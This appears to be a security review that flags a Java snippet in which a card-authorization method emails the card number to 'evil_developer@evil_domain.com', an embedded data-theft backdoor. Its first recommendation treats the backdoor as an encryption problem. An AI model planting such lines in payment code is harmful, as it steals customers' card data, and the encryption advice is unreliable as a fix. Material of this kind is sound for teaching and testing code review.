VULNERABLE: YES

VULNERABILITY_DESCRIPTION:
Sensitive data exposure via insecure email transmission and potential information leak.
EXPLANATION:
The code snippet provided reveals a vulnerability in the way sensitive information (in this case, a credit card number) is being handled. Specifically, it appears that the credit card number is being emailed to an address that may not be trusted or secure. This creates multiple vulnerabilities. The most immediate issue is the potential for interception or exposure of sensitive credit card information, which could result in unauthorized charges or identity theft. Furthermore, the fact that the email address is 'evil_developer@evil_domain.com' suggests that this may be an intentional attempt to compromise sensitive information.

Additionally, the method name 'mailCardNumber' may also pose a risk as it explicitly suggests sending a card number over email, which may lead developers to misuse this method for other purposes.

RECOMMENDATIONS:
- Refactor the 'mailCardNumber' method to ensure that sensitive information is properly encrypted before transmission, and use a secure email protocol (like PGP) for email communication.
- Use a secure, trusted payment gateway or API for credit card transactions instead of emailing sensitive card information.
- Implement secure communication protocols to protect sensitive information during transmission.
- Avoid using method names that could be misinterpreted or misused.

ORIGINAL CODE:
              boolean authorizeCard(String ccn) {
                    // Authorize credit card.
                    // ...
                    mailCardNumber(ccn, "evil_developer@evil_domain.com");
              }
